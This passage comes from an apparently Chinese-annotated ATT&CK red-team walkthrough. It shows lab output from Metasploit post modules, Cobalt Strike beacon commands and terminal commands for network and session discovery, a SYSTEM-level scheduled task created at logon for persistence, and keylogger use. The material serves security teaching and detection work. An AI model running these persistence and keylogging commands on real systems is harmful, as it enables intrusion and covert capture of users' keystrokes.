  UDP    [::1]:63143            <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    3456
  UDP    [fe80::bc99:52b6:7f3b:cdb8%11]:1900  <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268
  UDP    [fe80::bc99:52b6:7f3b:cdb8%11]:62899  <span class="pl-k">*</span>:<span class="pl-k">*</span>                                    2268</pre></div>
<h4><a id="user-content-msf下操作-12" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-12"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>/post/windows/gather/tcpnetstat</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 exploit(windows/local/trusted_service_path) <span class="pl-k">&gt;</span> use post/windows/gather/tcpnetstat
msf5 post(windows/gather/tcpnetstat) <span class="pl-k">&gt;</span> show options 

Module options (post/windows/gather/tcpnetstat):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/tcpnetstat) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> session 1
session =<span class="pl-k">&gt;</span> 1
msf5 post(windows/gather/tcpnetstat) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] TCP Table Size: 472
[<span class="pl-k">*</span>] Total TCP Entries: 13
[<span class="pl-k">*</span>] Connection Table
================

  STATE        LHOST          LPORT  RHOST          RPORT
  -----        -----          -----  -----          -----
  ESTABLISHED  192.168.2.114  1068   192.168.2.103  5555
  LISTEN       0.0.0.0        80     0.0.0.0        _
  LISTEN       0.0.0.0        135    0.0.0.0        _
  LISTEN       0.0.0.0        445    0.0.0.0        _
  LISTEN       0.0.0.0        1025   0.0.0.0        _
  LISTEN       0.0.0.0        1026   0.0.0.0        _
  LISTEN       0.0.0.0        1035   0.0.0.0        _
  LISTEN       0.0.0.0        1801   0.0.0.0        _
  LISTEN       0.0.0.0        2103   0.0.0.0        _
  LISTEN       0.0.0.0        2105   0.0.0.0        _
  LISTEN       0.0.0.0        2107   0.0.0.0        _
  LISTEN       0.0.0.0        3306   0.0.0.0        _
  LISTEN       192.168.2.114  139    0.0.0.0        _

[<span class="pl-k">*</span>] Post module execution completed
</pre></div>
<p>####　ｃs下操作：</p>
<blockquote>
<p>shell c:\windows\sysnative\netstat.exe -ano</p>
</blockquote>
<pre><code>beacon&gt; shell c:\windows\system32\netstat.exe -ano
[*] Tasked beacon to run: c:\windows\system32\netstat.exe -ano
[+] host called home, sent: 67 bytes
[+] received output:

Active Connections

  Proto  Local Address          Foreign Address        State           PID
  TCP    0.0.0.0:80             0.0.0.0:0              LISTENING       1100
  TCP    0.0.0.0:135            0.0.0.0:0              LISTENING       688
  TCP    0.0.0.0:445            0.0.0.0:0              LISTENING       4
  TCP    0.0.0.0:1025           0.0.0.0:0              LISTENING       400
  TCP    0.0.0.0:1026           0.0.0.0:0              LISTENING       984
  TCP    0.0.0.0:1035           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:1801           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:2103           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:2105           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:2107           0.0.0.0:0              LISTENING       1932
  TCP    0.0.0.0:3306           0.0.0.0:0              LISTENING       1252
  TCP    192.168.2.114:139      0.0.0.0:0              LISTENING       4
  TCP    192.168.2.114:1068     192.168.2.103:5555     ESTABLISHED     572
  TCP    192.168.2.114:1530     192.168.2.105:139      TIME_WAIT       0
  TCP    192.168.2.114:1531     192.168.2.105:139      TIME_WAIT       0
  TCP    192.168.2.114:1532     120.41.45.100:80       TIME_WAIT       0
  UDP    0.0.0.0:445            *:*                                    4
  UDP    0.0.0.0:500            *:*                                    400
  UDP    0.0.0.0:1027           *:*                                    748
  UDP    0.0.0.0:1034           *:*                                    1932
  UDP    0.0.0.0:3527           *:*                                    1932
  UDP    0.0.0.0:4500           *:*                                    400
  UDP    127.0.0.1:123          *:*                                    800
  UDP    192.168.2.114:123      *:*                                    800
  UDP    192.168.2.114:137      *:*                                    4
  UDP    192.168.2.114:138      *:*                                    4



</code></pre>
<h3><a id="user-content-display-active-smb-sessions显示活动的smb会话" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#display-active-smb-sessions%E6%98%BE%E7%A4%BA%E6%B4%BB%E5%8A%A8%E7%9A%84smb%E4%BC%9A%E8%AF%9D"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Display active SMB sessions(显示活动的smb会话)</h3>
<h4><a id="user-content-terminal下操作-14" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-14"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>net session | find / "\"</p>
</blockquote>
<pre><code>PS C:\Users\Administrator\Desktop\powrshell&gt; net session | find / "\\"
FIND: 无效的开关
</code></pre>
<h4><a id="user-content-msf下操作-13" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-13"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>post/windows/gather/enum_logged_on_users</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>msf5 post(windows/gather/tcpnetstat) <span class="pl-k">&gt;</span> use post/windows/gather/enum_logged_on_users
msf5 post(windows/gather/enum_logged_on_users) <span class="pl-k">&gt;</span> show options 

Module options (post/windows/gather/enum_logged_on_users):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   CURRENT  <span class="pl-c1">true</span>             yes       Enumerate currently logged on users
   RECENT   <span class="pl-c1">true</span>             yes       Enumerate Recently logged on users
   SESSION                   yes       The session to run this module on.

msf5 post(windows/gather/enum_logged_on_users) <span class="pl-k">&gt;</span> <span class="pl-c1">set</span> session 1
session =<span class="pl-k">&gt;</span> 1
msf5 post(windows/gather/enum_logged_on_users) <span class="pl-k">&gt;</span> exploit 

[<span class="pl-k">*</span>] Running against session 1

Current Logged Users
====================

 SID                                            User
 ---                                            ----
 S-1-5-21-1911985068-4225083820-4011728908-500  ROOT-5DE52AC98B<span class="pl-cce">\A</span>dministrator


[+] Results saved in: /root/.msf4/loot/20190907124429_default_192.168.2.114_host.users.activ_626805.txt

Recently Logged Users
=====================

 SID                                            Profile Path
 ---                                            ------------
 S-1-5-18                                       %systemroot%<span class="pl-cce">\s</span>ystem32<span class="pl-cce">\c</span>onfig<span class="pl-cce">\s</span>ystemprofile
 S-1-5-19                                       %SystemDrive%<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\L</span>ocalService
 S-1-5-20                                       %SystemDrive%<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\N</span>etworkService
 S-1-5-21-1911985068-4225083820-4011728908-500  %SystemDrive%<span class="pl-cce">\D</span>ocuments and Settings<span class="pl-cce">\A</span>dministrator


[<span class="pl-k">*</span>] Post module execution completed
</pre></div>
<h4><a id="user-content-cs下操作-16" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-16"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell net session | find / "\"</p>
</blockquote>
<pre><code>beacon&gt; shell net session | find / "\\"
[*] Tasked beacon to run: net session | find / "\\"

</code></pre>
<h2><a id="user-content-scheduled-task计划任务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#scheduled-task%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Scheduled Task(计划任务)</h2>
<p>原理：</p>
<pre><code>Utilities such as at and schtasks, along with the Windows Task Scheduler, can be used to schedule programs or scripts to be executed at a date and time. A task can also be scheduled on a remote system, provided the proper authentication is met to use RPC and file and printer sharing is turned on. Scheduling a task on a remote system typically required being a member of the Administrators group on the the remote system. [1]

An adversary may use task scheduling to execute programs at system startup or on a scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, to gain SYSTEM privileges, or to run a process under the context of a specified account.

主要就是使用at或者sc命令去启动一个程序，不过需要满足使用RPC的适当身份验证
</code></pre>
<h3><a id="user-content-display-all-currently-scheduled-tasks显示所有的计划任务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#display-all-currently-scheduled-tasks%E6%98%BE%E7%A4%BA%E6%89%80%E6%9C%89%E7%9A%84%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Display all currently scheduled tasks（显示所有的计划任务）</h3>
<h4><a id="user-content-terminal下操作-15" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-15"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>schtasks [/s HOSTNAME]</p>
</blockquote>
<pre><code>PS C:\Users\Administrator\Desktop\powrshell&gt; schtasks

文件夹: \
任务名                                   下次运行时间           模式
======================================== ====================== ===============
信息: 目前在你的访问级别上不存在任何可用的计划任务。

文件夹: \Microsoft
任务名                                   下次运行时间           模式
======================================== ====================== ===============
信息: 目前在你的访问级别上不存在任何可用的计划任务。

文件夹: \Microsoft\Windows
任务名                                   下次运行时间           模式
======================================== ====================== ===============
信息: 目前在你的访问级别上不存在任何可用的计划任务。

文件夹: \Microsoft\Windows\.NET Framework

</code></pre>
<h4><a id="user-content-cs下操作-17" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-17"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>shell schtasks</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>beacon<span class="pl-k">&gt;</span> shell schtasks
[<span class="pl-k">*</span>] Tasked beacon to run: schtasks
[+] host called home, sent: 39 bytes
[+] received output:
信息: 系统里没有计划任务。
</pre></div>
<h3><a id="user-content-create-a-scheduled-task创建一个计划任务" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#create-a-scheduled-task%E5%88%9B%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Create a scheduled task(创建一个计划任务)</h3>
<h4><a id="user-content-terminal下操作-16" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-16"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<pre><code>schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
net start schedule
sc config schedule start= auto
</code></pre>
<div class="highlight highlight-source-shell"><pre>PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> net start schedule
请求的服务已经启动。

请键入 NET HELPMSG 2182 以获得更多的帮助。

PS C:<span class="pl-cce">\U</span>sers<span class="pl-cce">\A</span>dministrator<span class="pl-cce">\D</span>esktop<span class="pl-cce">\p</span>owrshell<span class="pl-k">&gt;</span> schtasks /create /tn <span class="pl-s"><span class="pl-pds">"</span>acachesrv<span class="pl-pds">"</span></span> /tr C:<span class="pl-cce">\f</span>ile<span class="pl-cce">\p</span>ath<span class="pl-cce">\h</span>ere.exe /sc ONLOGON /ru
<span class="pl-s"><span class="pl-pds">"</span>System<span class="pl-pds">"</span></span>

成功: 成功创建计划任务 <span class="pl-s"><span class="pl-pds">"</span>acachesrv<span class="pl-pds">"</span></span>。
</pre></div>
<h4><a id="user-content-cs下操作-18" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-18"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<pre><code>shell schtasks [/S HOSTNAME] /create /tn "acachesrv" /tr C:\file\path\here.exe /sc ONLOGON /ru "System" [/rp password]
Requirements for running scheduled tasks:
shell net start schedule
shell sc config schedule start= auto
</code></pre>
<h2><a id="user-content-input-capture输入捕捉键盘记录" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#input-capture%E8%BE%93%E5%85%A5%E6%8D%95%E6%8D%89%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Input Capture（输入捕捉（键盘记录））</h2>
<h3><a id="user-content-start-a-keylogger开始键盘记录" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#start-a-keylogger%E5%BC%80%E5%A7%8B%E9%94%AE%E7%9B%98%E8%AE%B0%E5%BD%95"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Start a keylogger（开始键盘记录）</h3>
<h4><a id="user-content-msf下操作-14" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#msf%E4%B8%8B%E6%93%8D%E4%BD%9C-14"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>msf下操作：</h4>
<blockquote>
<p>starting the keylogger:</p>
<p>keyscan_start</p>
<p>when you're ready to get the logs:</p>
<p>keyscan_dump</p>
<p>when you're done keylogging:</p>
<p>keyscan_stop</p>
</blockquote>
<div class="highlight highlight-source-shell"><pre>meterpreter <span class="pl-k">&gt;</span> keyscan_start 
Starting the keystroke sniffer ...
meterpreter <span class="pl-k">&gt;</span> keyscan_dump 
Dumping captured keystrokes...
1513215212

meterpreter <span class="pl-k">&gt;</span> keyscan_stop 
Stopping the keystroke sniffer...
</pre></div>
<h4><a id="user-content-cs下操作-19" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#cs%E4%B8%8B%E6%93%8D%E4%BD%9C-19"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>cs下操作：</h4>
<blockquote>
<p>keylogger 1320 x86(进程名、系统版本)</p>
</blockquote>
<pre><code>beacon&gt; keylogger 1200 x86
[*] Tasked beacon to log keystrokes in 1200 (x86)
[+] host called home, sent: 65610 bytes
[-] could not open process 1200: 5
[-] Could not connect to pipe: 2
[+] received keystrokes
[+] received keystrokes
beacon&gt; keylogger 1328 null
[*] Tasked beacon to log keystrokes in 1328 (null)
[+] host called home, sent: 65610 bytes
[-] could not open process 1328: 5
[-] Could not connect to pipe: 2
[+] received keystrokes

</code></pre>
<h2><a id="user-content-process-discovery进程获取" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#process-discovery%E8%BF%9B%E7%A8%8B%E8%8E%B7%E5%8F%96"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Process Discovery(进程获取)</h2>
<h3><a id="user-content-enumerate-running-processes枚举运行的进程" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#enumerate-running-processes%E6%9E%9A%E4%B8%BE%E8%BF%90%E8%A1%8C%E7%9A%84%E8%BF%9B%E7%A8%8B"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>Enumerate running processes（枚举运行的进程）</h3>
<h4><a id="user-content-terminal下操作-17" class="anchor" aria-hidden="true" href="https://github.com/lengjibo/ATT-CK-CN/blob/master/ATT%26CK%E6%A8%A1%E5%9E%8B.md#terminal%E4%B8%8B%E6%93%8D%E4%BD%9C-17"><svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path fill-rule="evenodd" d="M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z"></path></svg></a>terminal下操作：</h4>
<blockquote>
<p>tasklist /v [/svc]</p>
</blockquote>
<blockquote>
